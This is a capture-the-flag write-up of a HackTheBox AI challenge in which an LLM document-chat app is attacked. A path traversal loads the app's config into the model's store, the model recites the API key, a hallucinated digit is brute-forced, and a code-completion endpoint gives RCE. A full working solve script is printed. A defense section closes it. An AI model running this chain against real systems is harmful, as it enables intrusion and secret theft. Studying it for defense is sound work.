---
title: "Chrono Mind"
date: 2027-11-29 09:00:00 -0500
categories: [HackTheBox, Challenges, Misc]
tags: [hackthebox, challenge, misc, ai, llm, prompt-injection, path-traversal, rce, cwe-22, cwe-94, cwe-1427]
description: "An Easy Misc/AI challenge: a 'chat-with-your-docs' assistant becomes a file-read oracle via path traversal, recites its own API key (badly — the tiny model hallucinates a digit), and a sibling code-completion endpoint turns that key into RCE."
---

## Overview

**Chrono Mind** is an Easy HackTheBox **Misc / AI** challenge. It ships a FastAPI app that wraps a tiny
local language model (`LaMini-Flan-T5-248M`) as a "chat about a knowledge base" assistant. The path from
zero to flag is a three-link chain: a [path traversal](https://cwe.mitre.org/data/definitions/22.html)
loads the app's own config file into the model's document store, the question-answering endpoint reads the
secret API key back out of it, and a sibling "AI copilot" endpoint runs attacker-supplied Python — so the
leaked key becomes [code execution](https://cwe.mitre.org/data/definitions/94.html) and a setuid flag read.

## The technique

The interesting part is that there is **no prompt injection** here — the model is a confused deputy, not a
hijacked one ([CWE-1427](https://cwe.mitre.org/data/definitions/1427.html) / OWASP LLM02 Sensitive
Information Disclosure). Three flaws compose:

1. **The document loader trusts user input as a path.** `getRepository(topic)` concatenates `topic` straight
   into a filesystem path, so `topic = "../config.py"` escapes the knowledge directory and loads the app's
   own configuration — which holds a secret `copilot_key` — into the LLM's retrieval corpus.

   ```python
   def getRepository(topic):
       for suffix in ['', '.md']:
           repoFile = f"{Config.knowledgePath}/{topic}{suffix}"   # CWE-22
           if os.path.exists(repoFile):
               return readFile(repoFile)
   # /create then: lm.store_doc(getRepository(topic))
   ```

2. **The Q&A endpoint recites whatever was loaded.** `/ask` runs extractive question-answering over that
   stored document, so simply asking *"What is the copilot_key?"* reads the secret straight back. The model's
   document store is effectively world-readable through the answer endpoint.

3. **A sibling endpoint execs code gated only on that key.** `/copilot/complete_and_run` runs `python3` over
   `user_code + model_completion`. Once the key is leaked, that is direct RCE.

   ```python
   if Config.copilot_key != params.copilot_key:
       return {"message": "Invalid API key"}
   full_code = params.code + lm.code(params.code).strip()
   return {"result": evalCode(full_code)}      # python3 full_code
   ```

Two non-obvious wrinkles make the solve robust:

- **The 248M model hallucinates the key.** `extract_answer` is *generative*, not a verbatim span copy, and a
  248M-parameter model cannot faithfully echo a 16-digit number — it deterministically returns **17** digits
  (where `secrets.randbelow(10**16)` can only produce ≤16). So you don't trust the recited string; you treat
  the API-key check as an oracle and brute the *single-deletion neighbourhood* — delete each character in turn
  (≤17 candidates) and the real key is the one that stops returning `Invalid API key`.
- **Empty completions are rejected.** The copilot endpoint bails with `Failed to get code completion` if the
  model returns nothing. Append a dangling statement like `x = ` so the code model always completes it into a
  valid expression, while an earlier `os.system('/readflag')` line still executes. Python parses the whole
  file before running it, so the appended completion only has to stay syntactically valid.

## Solution

The full chain is a single script. `/readflag` is a setuid-root helper that cats `/root/flag`.

Create `solve.py`:

```python
import sys, re, requests

T = sys.argv[1]
base = f"http://{T}/api"

# 1. path traversal -> load config.py (with the secret key) into the LLM doc store
room = requests.post(f"{base}/create", json={"topic": "../config.py"}).json()["room"]

# 2. ask the model to recite the secret (greedy decode, one hallucinated extra digit)
r = requests.post(f"{base}/ask", json={"prompt": "What is the copilot_key?"},
                  cookies={"room": room})
leaked = re.findall(r"\d+", r.json()["answer"])[0]

# 3. brute single-deletion candidates; dangling "x = " forces a non-empty completion
payload = "import os\nos.system('/readflag')\nx = "
for i in range(len(leaked)):
    cand = leaked[:i] + leaked[i+1:]
    j = requests.post(f"{base}/copilot/complete_and_run",
                      json={"copilot_key": cand, "code": payload}).json()
    if j.get("message") == "Invalid API key":
        continue
    flag = re.search(r"HTB\{[^}]+\}", j.get("result", "") or "")
    if flag:
        print(flag.group(0))
        break
```

Run it against the live instance:

```bash
python3 solve.py <target-host>:<port>
# [+] room (config.py loaded into LLM): 50e78d4f-...
# [+] LLM-leaked key (17 digits, one hallucinated): 748652718188281xx
# [+] valid copilot_key (16 digits): <recovered>
# [+] FLAG: HTB{...}
```

## Why it worked

The application treats the LLM as a trust boundary it is not. Anything the path traversal loads into the
retrieval corpus is read back through `/ask`, including the app's own secrets — the model has no concept of
"this document is confidential," it just answers the question. And the copilot endpoint hands attacker-
influenced text straight to `python3`; the model in the middle is irrelevant to the RCE, the static key was
the only gate, and that key leaked one endpoint earlier. Even the model's imprecision doesn't save it — the
single-digit hallucination is trivially recovered against the auth oracle.

## Fix / defense

- **Confine the document path.** `os.path.realpath` the resolved file and reject anything outside the
  knowledge directory; whitelist topic names. The traversal is the root cause.
- **Keep secrets out of the corpus.** Treat the retrieval store as world-readable; never place config,
  source, or credentials anywhere the loader can reach.
- **Never `exec`/`python3` model or user output.** If code execution is a real feature, sandbox it — no
  network, no filesystem, a dedicated low-privilege uid, and certainly no setuid-root `/readflag` reachable
  from inside it.
- **Use real auth and rate-limit.** A single shared numeric key is brute-forceable; rate-limiting the answer
  and auth endpoints also kills the deletion-neighbourhood brute of a hallucinated secret.
